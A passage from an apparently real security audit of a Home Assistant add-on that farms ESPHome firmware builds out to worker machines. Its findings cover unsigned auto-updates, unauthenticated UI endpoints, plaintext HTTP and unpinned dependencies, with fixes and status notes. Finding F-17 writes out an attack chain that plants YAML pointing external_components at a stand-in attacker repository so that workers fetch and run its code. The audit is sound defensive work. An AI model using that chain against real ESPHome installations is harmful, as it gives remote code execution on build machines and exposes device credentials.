The path check (`target.parent != client_dir`) prevents writing outside the client directory, which is a correct safeguard. However, the content written is unchecked Python source that will execute with the client process's full privileges as soon as `os.execv` is called.

This means:

- If the server is compromised, every connected build worker immediately executes attacker-controlled code.
- If the HTTP connection is intercepted (the transport is plaintext HTTP — see F-05), a MitM attacker can inject arbitrary code.
- There is no signature verification, checksum, or integrity check of any kind on the downloaded files.
- The version check is purely a string comparison (`sv != CLIENT_VERSION`); the server controls both the version string and the code.

Additionally, `api.py` lines 237–252 (`get_client_code`) simply globs `*.py` files from `/app/client/` and returns them verbatim. There is no manifest, no signing key, and no way for the worker to distinguish a legitimate update from a tampered one.

**Affected code:** `client/client.py:480-518` (`_apply_update`), `api.py:237-253` (`get_client_code`)

**Recommended fix:**

The safest fix is to remove the auto-update mechanism entirely and rely on Docker image updates. If auto-update is retained, the server should sign the code bundle (e.g., with a private key stored in `/data/`), and the worker should verify the signature before writing any files. At minimum, add a SHA-256 hash of the bundle to the server response and verify it worker-side. The hash alone does not prevent a MitM attack over HTTP, but combined with HTTPS it provides meaningful integrity.

---

### F-03 — UI API Has No Authentication; Relies Entirely on HA Ingress

**Status:** AVAILABLE (opt-in) via `require_ha_auth` add-on option (AU.3). AU.7 (1.5.0) flipped the default to `true`; bug #83 (1.6.2) flipped it back to `false` because the true default hard-broke the standalone `docker-compose` path where there's no Home Assistant Supervisor to validate against. When enabled, direct-port `/ui/api/*` requests (and the static UI shell) that don't carry a valid Bearer token are rejected with 401 + `WWW-Authenticate: Bearer realm="Fleet for ESPHome"`; browsers land on a styled HTML remediation page, API clients keep the original JSON body. Two Bearer shapes are accepted: (a) the add-on's own shared worker token — used by the native HA integration's coordinator, which receives it automatically via the Supervisor-discovery payload (AU.7); (b) a Home Assistant long-lived access token, validated against Supervisor's `/auth` endpoint (AU.2). Ingress-tunneled access is always allowed — Supervisor's peer-IP trust short-circuits the middleware before the flag is read. Users whose direct port is exposed to an untrusted network enable the flag in Settings → Authentication. See AU.1–AU.7 in WORKITEMS-1.5.md and bug #83 in WORKITEMS-1.6.2.md.

**Severity:** MEDIUM (HIGH if port 8765 is directly reachable) — pre-fix

**Description:**

All `/ui/api/*` endpoints are unconditionally allowed by the auth middleware in `main.py` lines 37-38:

```python
if path.startswith("/ui/api/") or path in ("/", "/index.html"):
    return await handler(request)
```

No token, session, or credential check of any kind is performed. This is acceptable when HA Ingress is the only path to those endpoints. However, the add-on also exposes port 8765 directly to the host network (`config.yaml` lines 18-19: `ports: 8765/tcp: 8765`).

If any of the following is true, the UI API is fully open to the LAN:

- The user has not configured a firewall rule blocking port 8765.
- The user accesses the UI via the direct port rather than through HA Ingress.
- Another device on the LAN makes a direct HTTP request to the HA host on port 8765.

Through the unauthenticated UI API, an attacker on the LAN can:

- Enqueue compile jobs for any configured ESPHome target (`POST /ui/api/compile`).
- Read full build logs, which may contain device credentials in error output (`GET /ui/api/queue`).
- Read and **write** any `.yaml` config file in the ESPHome config directory (`GET/POST /ui/api/targets/{filename}/content`).
- Read device IP addresses, firmware versions, and other device metadata.
- Remove or disable build workers.

**Affected code:** `main.py:37-38`, `ui_api.py` (all endpoints), `config.yaml:18-19`

**Recommended fix:**

Add a secondary auth check to the UI API that validates the `X-Ingress-Path` or `X-Supervisor-Token` header (both injected by HA Ingress and absent on direct connections). Alternatively, bind the server to `127.0.0.1` only for the ingress path, and use a separate port with token auth for direct client access. At minimum, document the exposure clearly and recommend a firewall rule.

---

### F-04 — `secrets.yaml` Included in Every Build Bundle Sent to Workers

**Severity:** MEDIUM

**Description:**

`scanner.py` lines 37-55 (`create_bundle`) tarballs the entire ESPHome config directory recursively and sends it to build workers as a base64-encoded payload in the job response:

```python
for path in sorted(base.rglob("*")):
    if not path.is_file():
        continue
    arcname = str(path.relative_to(base))
    tar.add(str(path), arcname=arcname)
```

`secrets.yaml` is intentionally excluded from the list of *compile targets* (`scan_configs` line 30), but it is explicitly included in the bundle because ESPHome's `!secret` directive requires it at compile time. The CLAUDE.md documentation acknowledges this.

The consequence is that every authenticated build worker receives a copy of `secrets.yaml` on every job, whether or not the specific target being compiled uses any secrets. `secrets.yaml` in a typical ESPHome installation contains Wi-Fi SSIDs and passwords, API encryption keys, OTA passwords, and MQTT credentials.

While build workers are authenticated and presumably trusted machines, this increases the blast radius of a compromised worker and unnecessarily distributes sensitive credentials to all build workers.

**Affected code:** `scanner.py:37-55` (`create_bundle`)

**Recommended fix:**

Parse the target YAML (ESPHome already has a resolver for this — `_resolve_esphome_config` in scanner.py does it) and identify which secrets are actually referenced by the specific target. Deliver only those secrets, or better, perform secret substitution server-side before bundling, so no `secrets.yaml` needs to leave the server at all. If server-side substitution is not feasible, at minimum document the exposure in the add-on description so operators understand what data leaves the HA host.

---

### F-05 — All Worker-Server Communication Is Plaintext HTTP

**Severity:** MEDIUM

**Description:**

Build workers connect to the server over `http://` (plaintext). The server URL is generated in the UI's docker command (`static/index.html:713`):

```javascript
const serverUrl = `http://${host}:${port}`;
```

For build workers connecting across a LAN, all of the following are transmitted in cleartext:

- The Bearer auth token (on every request).
- The full ESPHome config bundle including `secrets.yaml` (F-04), sent per job.
- Build logs which may contain device credentials in error output.
- The worker auto-update code (see F-02 — MitM can inject arbitrary Python).

On most home networks, this risk is low in practice, but it is a meaningful concern in environments where the HA host and the build workers are on separate network segments (e.g., a remote builder in a different physical location).

**Affected code:** `static/index.html:713`, `run.sh:24`, `client/client.py:261-264` (HEADERS)

**Recommended fix:**

Support HTTPS for the server. For a home network add-on, the most practical option is to allow the user to configure an existing reverse proxy (Nginx Proxy Manager, Traefik) in front of port 8765 and document that as the recommended path for remote clients. Add a configuration option `require_https: bool` that logs a warning if remote clients connect over HTTP.

---

### F-06 — Supervisor IP Bypass Allows Unauthenticated API Access from HA Supervisor

**Status (2026-04-16):** **WONTFIX** — by design for an HA add-on. The `172.30.32.2` bypass is the standard HA Supervisor-trust pattern: any add-on on the Supervisor-controlled Docker bridge network is inside the same trust boundary as the Supervisor itself. The 1.3.1 hardening (`_normalize_peer_ip()` handling IPv6 / zone IDs / `peername=None` / IPv4-mapped IPv6; structured 401 logging) stays. The IP constant (`HA_SUPERVISOR_IP`) stays named so any future Supervisor-IP change is a one-spot fix.

**Severity:** LOW (info for the deployment model; design decision to document)

**Description:**

`main.py` lines 47-48 and `api.py` lines 45-46 unconditionally trust any request originating from `172.30.32.2`:

```python
if peer_ip == "172.30.32.2":
    return await handler(request)
```

This is the HA Supervisor's internal address, and the intent is to allow the supervisor to call the worker API without needing a token. The trust is based solely on the source IP, which is not spoofable from outside the Docker network in a normal HA installation.

However, this means any process on the same Docker network as the add-on (including other HA add-ons that may be compromised) can make unauthenticated requests to all `/api/v1/*` endpoints, including job manipulation, worker registration, and log retrieval.

The IP is also hardcoded as a string literal in two places; if the Supervisor's IP ever changes, the bypass silently stops working with no diagnostic.

**Affected code:** `main.py:47-48`, `api.py:45-46`

**Recommended fix:**

Consider whether the Supervisor actually needs to call `/api/v1/*` endpoints at all. If not, remove the bypass entirely. If yes, prefer HA's `SUPERVISOR_TOKEN` header (`X-Supervisor-Token`) over IP-based trust, as it is a proper credential rather than a network address. Define the IP as a named constant or config value rather than a bare string literal.

---

### F-07 — No Rate Limiting or Queue Size Cap

**Status (2026-04-16):** **WONTFIX** for the home-lab threat model. The operator is trusted; queue-flooding from the UI requires HA credentials. The 1.3.x partial-mitigations (per-job log size cap of 512 KB via SEC.2; `max_parallel_jobs` clamp to 0–32 via SEC.3; `Content-Length` guard ~2 MB on log-append via C.3 → HTTP 413) stay as sensible sanity limits. No queue-depth cap or retry rate-limit planned — a home fleet at 67 devices doesn't generate queue pressure worth defending against.

**Severity:** LOW

**Description:**

Any authenticated worker (or a UI user, who is unauthenticated — see F-03) can enqueue jobs without any rate limit or maximum queue depth. The `JobQueue.enqueue` method deduplicates by target (one active job per target), which provides meaningful protection against trivial queue flooding for known targets. However:

- A worker with the token can rapidly submit result payloads with arbitrarily large log strings. The `log` field is stored in memory and persisted to `/data/queue.json` with no size cap.
- The `/ui/api/retry` endpoint can be called repeatedly to re-enqueue failed jobs, creating a cycle with no backoff.
- The queue file path is hardcoded to `/data/queue.json`. If `/data` is on the same filesystem as the HA OS, a malicious or buggy worker submitting huge logs could potentially exhaust disk space.

**Affected code:** `job_queue.py:166-216` (`enqueue`), `api.py:177-207` (`submit_job_result`)

**Recommended fix:**

Add a maximum log length (e.g., 512 KB) when accepting job results. Add a maximum total queue size (e.g., 500 jobs). Consider a rate limit on the retry endpoint.

---

### F-08 — Job ID Is Not Validated Against the Claiming Worker

**Status (2026-04-16):** **WONTFIX** per threat model — every authenticated worker is trusted (shared-bearer-token model; a compromised token = full fleet compromise via many other paths). Partial credit: the firmware-upload endpoint added in 1.4.1 **does** enforce `X-Client-Id == job.assigned_client_id` (bug #24 fix — data-loss race), but that was done because the race caused *non-malicious* data loss, not because the threat model requires per-worker authorization in general. `submit_result` / `update_status` still accept any authenticated worker writing to any job. Not remediating further.

**Severity:** LOW

**Description:**

`api.py` lines 177-207 (`submit_job_result`) accepts a result from any authenticated worker for any job ID, regardless of whether that worker was assigned the job:

```python
job_id = request.match_info["id"]
...
ok = await queue.submit_result(job_id, status, log, ota_result)
```

The `queue.submit_result` method does check that the job is in `WORKING` state, but it does not verify that the submitting worker is the one assigned to the job (`job.assigned_client_id`). This means:

- Worker A can submit a failure result for a job that was assigned to Worker B, causing the job to be marked failed even though Worker B is still working on it.
- A malicious or buggy worker can poison job results for other workers' work.

The same issue applies to `update_job_status` (`/api/v1/jobs/{id}/status`): any authenticated worker can update the status text of any job.

**Affected code:** `api.py:177-207` (`submit_job_result`), `api.py:210-226` (`update_job_status`), `job_queue.py:259-299` (`submit_result`)

**Recommended fix:**

Pass the submitting `client_id` (from the authentication context, not from the request body) to `queue.submit_result` and `queue.update_status`, and reject submissions where `client_id != job.assigned_client_id`.

---

### F-09 — Path Traversal Check Uses `resolve()` on a Non-Existent Path

**Severity:** LOW

**Description:**

`ui_api.py` lines 213-218 and 233-238 guard against path traversal using `Path.resolve()` before the file exists:

```python
path = (config_dir / filename).resolve()
try:
    path.relative_to(config_dir.resolve())
except ValueError:
    return web.json_response({"error": "Invalid filename"}, status=400)
```

`Path.resolve()` on a non-existent path behaves differently across Python versions. On Python 3.5 and earlier, it raises `FileNotFoundError` for non-existent paths; on Python 3.6+, it resolves the path purely lexically if `strict=False` (the default). On Python 3.6+, this check is correct for preventing `../` traversal because lexical resolution handles `..` components.

However, the check does not defend against symlinks: if the ESPHome config directory contains a symlink that points outside the directory, `resolve()` will follow the symlink and the `relative_to` check will fail (raising `ValueError`), so the file would be rejected — this is the correct behavior. **But** for the write endpoint (`save_target_content`), the check only guards the *path*; it does not prevent writing a YAML file that itself contains `!include` directives pointing to files outside the config directory. This is then processed by `_resolve_esphome_config` via ESPHome's own YAML resolver.

**Affected code:** `ui_api.py:213-218`, `ui_api.py:233-238`

**Recommended fix:**

The existing check is adequate for the file read/write operations themselves. Consider adding `strict=True` to the `resolve()` call on the read path (where the file must exist) to make the intent explicit and catch edge cases. Document that the ESPHome YAML `!include` attack surface is inherited from ESPHome's own resolver, not this server.

---

### F-10 — Monaco Editor Loaded from Unpinned CDN

**Severity:** LOW

**Description:**

`static/index.html` lines 1345-1348 load the Monaco editor from `unpkg.com`:

```javascript
script.src = 'https://unpkg.com/monaco-editor@0.44.0/min/vs/loader.js';
require.config({ paths: { vs: 'https://unpkg.com/monaco-editor@0.44.0/min/vs' } });
```

The version `0.44.0` is pinned, which is good. However, `unpkg.com` is a third-party CDN with no SRI (Subresource Integrity) hash on the script tag. If `unpkg.com` is compromised, or if an attacker can intercept the HTTP request to it (the UI itself is served over plaintext — see F-05), they can inject arbitrary JavaScript into the admin UI. This would give them access to the token stored in `serverInfo.token` (see F-01).

The ESPHome logo is also loaded from `https://media.esphome.io/` and the favicon from `https://esphome.io/`, expanding the external script/resource surface.

**Affected code:** `static/index.html:1345-1348`

**Recommended fix:**

Add `integrity="sha384-..."` SRI attributes to the Monaco script tag. Better, bundle Monaco into the Docker image and serve it as a static file, eliminating the external CDN dependency entirely. This also makes the UI work in offline/air-gapped HA installations.

---

### F-11 — Build Log Content Stored Unredacted

**Status (2026-04-16):** **Not a finding (INFO)** — re-assessed. The logs contain values (WiFi passwords, API keys, OTA passwords) that the **server itself distributed** to the worker via the job bundle's `secrets.yaml` (F-04, accepted). When the worker logs an error containing those substituted values, it's returning data the server already has back to the server that sent it. No trust boundary is crossed, no information is leaked that wasn't already on the server's disk. Displaying those logs in the browser UI is an F-03-adjacent concern already addressed by the mandatory `require_ha_auth` in 1.5 (AU.7). Removing from the residual-findings list.

**Severity:** LOW

**Description:**

`api.py` lines 189, 203 accept and store the `log` field from clients without any filtering or size limit. Build logs from ESPHome compilation frequently contain:

- Wi-Fi SSID and password (when a compile error includes the full config in the traceback).
- OTA password.
- API encryption key.
- Any value substituted from `secrets.yaml` via ESPHome's substitution system.

These logs are returned verbatim to the browser UI via `/ui/api/queue`, accessible without authentication (see F-03).

**Affected code:** `api.py:189,203`, `job_queue.py:66-87` (`to_dict`), `ui_api.py:94-99` (`get_queue`)

**Recommended fix:**

Consider scrubbing known-sensitive patterns from build logs before storage (e.g., lines containing `password:`, `key:`, `ssid:` where the value appears to be a secret). This is imperfect but reduces accidental exposure. More robustly, restrict the queue/log API to authenticated access even in the UI tier.

---

### F-12 — Dependency Versions Not Pinned

**Severity:** LOW

**Description:**

`ha-addon/server/requirements.txt` uses minimum-version constraints only (`>=`):

```
aiohttp>=3.9
aioesphomeapi>=18.0
zeroconf>=0.131
pyyaml>=6.0
esphome>=2024.1.0
requests>=2.31
```

This means each Docker image build resolves the latest compatible versions of all dependencies at build time. A supply-chain compromise of any upstream package that releases a new version compatible with the `>=` constraint will be automatically included in the next image build.

`client/requirements.txt` has a single line `requests>=2.31`, making the client even more exposed.

**Affected code:** `ha-addon/server/requirements.txt`, `client/requirements.txt`

**Recommended fix:**

Use exact pins (`==`) with a hash-locked file (`pip-compile --generate-hashes` → `requirements.lock`) and install with `pip install --require-hashes -r requirements.lock` in both Dockerfiles. Pair this with a weekly Dependabot/Renovate job and a release-time gate in `dev-plans/RELEASE_CHECKLIST.md` that refuses to ship if any direct or transitive dependency has a known high/critical advisory per `pip-audit` / `npm audit`. Partial pinning (`~=3.9`) is not sufficient for supply-chain integrity — without hashes, a compromised upstream can publish a matching patch version that will be silently adopted on the next image rebuild.

---

### F-13 — Docker Image Uses `$BUILD_FROM` Without Pinned Base

**Severity:** LOW

**Status (2026-04-22, 1.6.2):** **FIXED** for the production path via IM.1–IM.3. `ha-addon/config.yaml` now carries `image: ghcr.io/weirded/{arch}-addon-esphome-dist-server`, so end-user installs pull our prebuilt image from GHCR. Those GHCR builds use the digest pinned in `ARG BUILD_FROM` without a Supervisor override, so the Dockerfile-level pin is the authoritative base for every production install. The Supervisor-driven local-build path (fallback when GHCR is unreachable, plus the `push-to-hass-4.sh` IM.5 strip for dev turns) still tag-resolves via `build.yaml` because Supervisor's `supervisor/validate.py` regex rejects `@sha256:…` in `build_from` — that path remains **partial** pending an upstream fix but is explicitly scoped as secondary. Worker (`ha-addon/client/Dockerfile`) stays fully digest-pinned. Server + client digests refreshed in lockstep on each release (current: `sha256:92c262…` as of 2026-04-22, Python 3.11.15-slim-trixie).

**Status (2026-04-20, 1.6.1):** **FIXED (partial)** via SS.4. The worker Dockerfile (`ha-addon/client/Dockerfile`) pins `FROM python:3.13-slim@sha256:…` — the single source of truth for every standalone worker deployment. The server add-on's `ha-addon/Dockerfile` also pins the `ARG BUILD_FROM` default digest, which governs local `docker build` without Supervisor. In production under Supervisor, the add-on base is overridden via `build.yaml`'s per-arch `build_from` map — and Supervisor's `supervisor/validate.py` regex rejects `@sha256:…` on that side (silently falls back to its own arch-base image, which then breaks `apt-get`). That's an upstream Supervisor constraint; the Dockerfile-level pin is authoritative everywhere else. Partial rather than FIXED because the last-mile Supervisor path isn't pinned; tracked for a future revisit if upstream relaxes the regex.

**Description:**

`ha-addon/Dockerfile` uses `ARG BUILD_FROM` without a default, meaning the base image is determined entirely by the HA add-on build system. The HA base images are generally well-maintained, but the Dockerfile itself has no mechanism to verify the provenance or integrity of the base image. Combined with unpinned Python dependencies, the image's dependency graph is fully determined at build time by external parties.

**Affected code:** `ha-addon/Dockerfile:1-2`

**Recommended fix:**

For builds you control directly, pin the `BUILD_FROM` to a specific digest (`FROM ghcr.io/home-assistant/...:sha256-...`). For HA add-on builds, this is partially constrained by the HA add-on build infrastructure, but documenting the trust assumption is worthwhile.

---

### F-14 — `run.sh` Reads Auth Token from Plaintext File with No Permission Check

**Status (2026-04-16):** **FIXED (1.5.0-dev.77)** via SA.2. `app_config.py` now invokes `TOKEN_FILE.chmod(0o600)` immediately after `write_text`, wrapped in try/except so a failed chmod logs at DEBUG rather than blocking startup (for filesystems where chmod is unavailable).

**Severity:** Info

**Description:**

`run.sh` lines 7-10 read the auth token from `/data/auth_token` using a polling loop:

```bash
TOKEN=$(cat /data/auth_token 2>/dev/null || echo "")
```

The file is created by `app_config.py` line 36 with no explicit mode — it inherits the process umask. Inside the Docker container, this is acceptable, but there is no verification that the file has restricted permissions (e.g., `0600`). If the `/data` volume is mounted with world-readable permissions on the host, the token is readable by any process on the host with access to the volume.

**Affected code:** `run.sh:7-10`, `app_config.py:36` (`TOKEN_FILE.write_text`)

**Recommended fix:**

Write the token file with explicit mode `0600`:
```python
TOKEN_FILE.write_bytes(token.encode())
TOKEN_FILE.chmod(0o600)
```

---

### F-15 — `X-Ingress-Path` Header Injected Into HTML Without Sanitization

**Status (2026-04-16):** **FIXED (1.5.0-dev.77)** via SA.1. `serve_index` now strips any character not in `[/A-Za-z0-9._-]` from the Supervisor-supplied `X-Ingress-Path` before interpolating it into `<base href="…">`. When the sanitized value is empty, falls through to the default `<base href="./">`. Defence-in-depth — Supervisor sets the header on the HA happy path and untrusted clients can't reach it there.

**Severity:** Info

**Description:**

`main.py` lines 118-123 inject the `X-Ingress-Path` header value into the HTML response using a simple string replace:

```python
html = html.replace(
    '<base href="./">',
    f'<base href="{ingress_path}">',
)
```

`X-Ingress-Path` is set by the HA Supervisor and should be a trusted value. In the HA ingress flow, this header cannot be set by untrusted clients. However, if the add-on is ever accessed via a path where the header could be influenced by a user (e.g., a misconfigured proxy), an attacker could inject arbitrary HTML attributes or break out of the `href` attribute. The Supervisor IP bypass on the API tier (`main.py:47`) does not apply here since this is a GET request to `/` or `/index.html`, which bypasses auth entirely.

**Affected code:** `main.py:116-124`

**Recommended fix:**

Sanitize `ingress_path` to contain only URL-safe characters (path segments, slashes) before injecting it into HTML. A simple regex `re.sub(r'[^/a-zA-Z0-9._-]', '', ingress_path)` is sufficient.

---

### F-16 — Registry Is Not Persistent; Worker State Lost on Server Restart

**Severity:** Info

**Description:**

`registry.py` is explicitly documented as "in-memory, no persistence needed." On server restart, all registered workers disappear. Combined with the job queue restart recovery (which resets `WORKING` jobs to `PENDING`), this is handled correctly. However, it means a worker that was mid-job when the server restarted will eventually time out and retry — which is correct behavior — but the `assigned_hostname` on restarted jobs is lost until the worker re-registers and re-claims.

This is an operational observation, not a security issue. It is noted here because the `to_dict` output for jobs includes `assigned_client_id` (a UUID) even after the worker has gone; the UI correctly falls back to `assigned_hostname` for display, but downstream tooling consuming the API should be aware.

**Affected code:** `registry.py`, `job_queue.py:53` (`assigned_hostname` field)

---

### F-17 — Unauthenticated UI + `external_components` in YAML → Worker RCE

**Status (2026-04-16):** **WONTFIX** per threat model. `external_components:`, `esphome.includes:`, and `libraries:` with git/URL sources are core ESPHome features that real users rely on (any half-interesting ESPHome config uses at least one). Scanning YAML and refusing to compile configs that use them would be a feature regression, not a hardening win. The **unauthenticated-UI** half of the finding is addressed by `require_ha_auth` (F-03 FIXED, mandatory in 1.5 per AU.7); YAML edits + compile enqueues now require HA auth, making this "authenticated HA user can RCE workers" — which is fine per the threat model (operator is trusted).

**Severity:** HIGH (if port 8765 is directly reachable) / MEDIUM (HA Ingress only)

**Description:**

ESPHome's YAML resolver supports an `external_components:` key that references a git repository. At compile time, ESPHome clones that repository and imports its Python modules into the compile process. This is a standard and intentional ESPHome feature.

In this project, the UI API `POST /ui/api/targets/{filename}/content` endpoint accepts arbitrary YAML content and writes it to the ESPHome config directory (path traversal is correctly blocked — see F-09). That endpoint lives behind the UI auth tier, which per F-03 has **no authentication of its own** and relies entirely on HA Ingress. If port 8765 is reachable directly (misconfigured firewall, direct-port access, another device on the Docker network), an unauthenticated attacker can:

1. `POST` a malicious YAML containing `external_components: [{ source: github://attacker/evil-component, components: [foo] }]`
2. `POST /ui/api/compile` to enqueue a compile job for that target
3. Wait for any worker to claim the job

When the worker compiles, ESPHome clones `attacker/evil-component` and executes its Python as part of the build. The attacker now has code execution on the worker with full access to `secrets.yaml` (F-04), network access to the ESP devices, and the ability to tamper with build artifacts flashed to those devices. The same vector works via `esphome.includes:` pointing at attacker-controlled Python, and via `libraries:` entries with git URLs.

This finding is an amplification of F-03 but deserves its own entry because the blast radius is **remote code execution on every build worker**, not just unauthorized config changes.

**Affected code:** `ha-addon/server/ui_api.py` (save_target_content), `ha-addon/server/scanner.py` (`_resolve_esphome_config`), `ha-addon/client/client.py` (compile path)

**Recommended fix:**

The cleanest fix is to close F-03 (add authentication to the UI API) — that alone removes the unauthenticated attacker and leaves only the "authorized HA user can RCE workers" case, which matches the stated trust model. For defence in depth, add a server-side YAML scan before enqueueing a job: reject (or require an explicit `allow_external_code: true` add-on option to accept) any target whose resolved config contains `external_components`, `esphome.includes` referencing Python files, or `libraries:` entries with git/URL sources. Worker-side, enforce the same check after bundle extraction and refuse to run the compile if the flag is not set.

---

### F-18 — Worker `pip install esphome==<version>` Is Not Hash-Pinned

**Status (2026-04-20, re-assessed and accepted in 1.6.1):** **WONTFIX** within the trusted-workers threat model.

SC.3 shipped in 1.5.0 as a partial fix: `ha-addon/client/esphome-constraints/<version>.txt` committed one hash-pinned constraints file per ESPHome version we had time to generate, and `version_manager._install()` consulted it for `pip install --require-hashes -r <file>`. Six months of operational data showed the defense was net-zero:

- **The committed version rarely matched the version actually installed.** We only committed one version at a time (most recently `2026.4.0.txt`). The HA ESPHome add-on reported the latest stable (`2026.4.1` by the time 1.6.1 opened), users with `pin_version` targeting older releases (`2024.12.x`, `2026.3.x`, etc.) missed the cache entirely, and the weekly regen workflow was always lagging one or two ESPHome releases behind. Hit rate: approximately 0% of real worker installs.
- **The documented fallback WAS the load-bearing path.** The original design logged a WARNING and installed unpinned when no constraints file matched, "so older ESPHome versions keep working through the upgrade". In practice, nearly every install hit that branch. The hardened path was aspirational; the unpinned path was production.
- **The committed file generated weekly Dependabot noise** (Dependabot scanned the ~1500-line `pip-compile` output as a requirements file and opened PRs to bump individual transitive deps like `tibs` / `resvg-py` / `uvicorn` that aren't even direct ESPHome deps — churn with no corresponding hardening).
- **The underlying threat is already accepted elsewhere.** Workers are trusted within this threat model (F-02, F-04, F-17 all WONTFIX on the same grounds): `external_components`, `esphome.includes`, `libraries:` git sources can all execute arbitrary Python at compile time regardless of whether the ESPHome wheel itself was hash-pinned. Hardening `pip install esphome==<version>` while leaving the much larger surface of ESPHome plugin-Python wide open was security theater.

What 1.6.1 removed:

- `ha-addon/client/esphome-constraints/` directory (one file: `2026.4.0.txt`, ~1500 lines).
- `scripts/regen-esphome-constraints.sh` (pip-compile wrapper).
- `.github/workflows/regen-esphome-constraints.yml` (weekly schedule).
- `_constraints_for()` helper + the `--require-hashes -r <file>` branch in `version_manager._install()` — the install is now a plain `pip install esphome==<version>`.
- `COPY esphome-constraints` line from `ha-addon/client/Dockerfile`.
- SC.3 references from `SECURITY.md`.

**What still applies from the original finding:** the install path is unpinned (as it was pre-SC.3), so a compromised PyPI wheel for ESPHome or any of its several-hundred transitive deps runs on the worker the next time a compile fires. This is the trust assumption. A deployment that doesn't match the trusted-home-network model — public-internet workers, shared multi-tenant workers, workers in a hostile LAN — should front PyPI with an internal mirror (`--index-url`) and commit its own hash-pinned lockfile there. Not something the add-on should enforce per-install by default.

**Severity:** HIGH (unchanged — the finding itself is still real; it's just accepted per threat model now).

**Affected code:** `ha-addon/client/version_manager.py` (simplified `_install()` post-1.6.1).

**What would move this back to FIXED:**

- An internal PyPI mirror + per-deployment constraints became the norm for users who care about the weaker trust model (out of scope for an opinionated HA add-on default).
- OR: ESPHome itself publishes signed wheels (cosign attestation, Sigstore, or similar) and pip gains native verification. At that point we re-enable verification without maintaining our own catalog.

Neither is a near-term roadmap item. The finding's re-classification is tracked in the Summary Table and the 2026-04-20 refresh note above.

---

### F-19 — GitHub Actions Referenced by Floating Tags

**Severity:** LOW

**Description:**

Every workflow in `.github/workflows/` references external actions by major-version tag (`actions/checkout@v4`, `actions/setup-python@v5`, `actions/setup-node@v4`, `actions/upload-artifact@v4`). Git tags are mutable, and a compromise of any of those action repos — or a tag-move attack — results in attacker-controlled code running in CI with access to repository secrets (including the `GITHUB_TOKEN` used to publish GHCR images on `main`).

**Affected code:** `.github/workflows/ci.yml`, `.github/workflows/compile-test.yml`, `.github/workflows/publish-client.yml`, `.github/workflows/publish-server.yml`

**Recommended fix:**

Pin each action to a full commit SHA with a trailing version comment, e.g. `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`. Dependabot understands this format and will open PRs to update the SHA + comment when a new version ships. Not included in this round: this is a low-severity hardening item but easy to do alongside the rest of Workstream E.

---

### F-20 — Missing Security Response Headers on UI Responses

**Severity:** LOW

**Description:**

`ha-addon/server/main.py` serves the React UI via `serve_index`, and `ui_api.py` returns JSON responses, but none of these responses set `Content-Security-Policy`, `X-Frame-Options` (or `Content-Security-Policy: frame-ancestors`), `X-Content-Type-Options`, or `Referrer-Policy`. An XSS vector (see F-01 / F-10 chain historically, and any future bug that reintroduces one) would have fewer mitigations to fight through than is standard for a credentialed admin UI. The UI also has no protection against being framed by a malicious HA dashboard card or an external page that tricks an authenticated HA user into clicking through to a compile action.

**Affected code:** `ha-addon/server/main.py` (`serve_index`), `ha-addon/server/ui_api.py` (all responses)

**Recommended fix:**

Add an aiohttp middleware that attaches the following headers to every UI-tier response:

- `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss: https://schema.esphome.io; frame-ancestors 'self'` (tune the list once C.5 moves the schema fetch server-side)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: no-referrer`
- `Permissions-Policy: accelerometer=(), camera=(), geolocation=(), microphone=()`

Do not apply these headers to the `/api/v1/*` worker tier — those responses are consumed programmatically and the headers add no value there.

---

### F-21 — Add-on ran unconfined (no AppArmor profile)

**Severity:** LOW

**Status (2026-04-20, 1.6.1):** **FIXED** via SS.1. `ha-addon/apparmor.txt` ships alongside `config.yaml`; `apparmor: true` is declared. Supervisor loads the profile on install/upgrade — dmesg confirms `operation="profile_load"` — and runs the container under confinement. The Supervisor security-star card reflects the change.

**Description:**

Before 1.6.1, the add-on's `config.yaml` had no `apparmor:` declaration. Supervisor loads such add-ons with the unconfined profile, meaning a compromised subprocess (the server itself, PlatformIO during compile, `esphome run`, `git` during auto-commit, …) could make any syscall the container's namespaces and capabilities allowed — no AppArmor-mediated ceiling. Defence-in-depth gap relative to any add-on that ships a profile.

The straightforward case for a profile on this add-on: we shell out to PlatformIO (downloads toolchains from the network, runs C/C++ compilers), `git` (writes the user's config dir), `esphome run` (opens raw sockets for OTA), and arbitrary Python in `external_components:` during compile. Even a permissive profile caps the worst-case path; a tightened profile would deny-by-default for categories (e.g. `mount,` outside explicit paths, `ptrace,` against non-child processes) we never legitimately use.

**Affected code:** `ha-addon/config.yaml`, `ha-addon/apparmor.txt`

**Applied fix (1.6.1):**

`ha-addon/apparmor.txt` ships as an attached profile named `esphome_dist_server` (Supervisor renames to `local_esphome_dist_server` on install). First-pass is deliberately permissive: explicit rules for `file,`, `capability,`, `network,`, `signal,`, `dbus,`, `unix,`, `mount,`, `pivot_root,`, `ptrace,`. Two earlier attempts with path-level allows hit denials — the stock `abstractions/python` include didn't cover `/usr/local/lib/libpython3.11.so.1.0` on our slim base (boot-time `DENIED open`), and a broader `file,` with explicit `deny /config/...` carveouts passed boot but broke PlatformIO's `penv` bootstrap during compile. The working set of narrow rules varies by Python minor version + PlatformIO release + ESPHome toolchain, so itemising them would churn on every upstream bump. Permissive-but-attached buys the security-star credit today; tightening is tracked against observed denial telemetry.

---

## OWASP Top 10 (2021) Assessment

A mapping of this project's findings against OWASP's Top 10 web application risks. Status reflects current code (1.7.0, last refreshed 2026-05-02).

| Category | Status | Evidence in this project |
|---|---|---|
| **A01 Broken Access Control** | Accepted per threat model | F-03 FIXED (mandatory `require_ha_auth` in 1.5, AU.7). F-06/F-07/F-08 all **WONTFIX** per threat model §4/§5/§3 (Supervisor / operator / workers all trusted). |
| **A02 Cryptographic Failures** | Accepted per threat model | F-05 WONTFIX (plaintext HTTP on trusted LAN), F-01 WONTFIX (browser is trusted; required for Connect Worker UX), **F-14 FIXED (1.5.0-dev.77 via SA.2)**. |
| **A03 Injection** | OK | Subprocess invocations use argument lists; YAML parsed via ESPHome's `safe_load`-based resolver; all `/api/v1/*` handlers parse through typed pydantic (1.3.1). **F-15 FIXED (1.5.0-dev.77 via SA.1)** — `X-Ingress-Path` sanitized before HTML interpolation. No remaining residual. |
| **A04 Insecure Design** | Accepted per threat model | F-02 **WONTFIX** (workers trusted), F-04 **WONTFIX** (workers trusted), F-17 **WONTFIX** (core ESPHome feature), **F-18 WONTFIX** (1.6.1 re-assessment — workers trusted; SC.3's hash-pinned constraints file rarely matched the version actually installed, removed). |
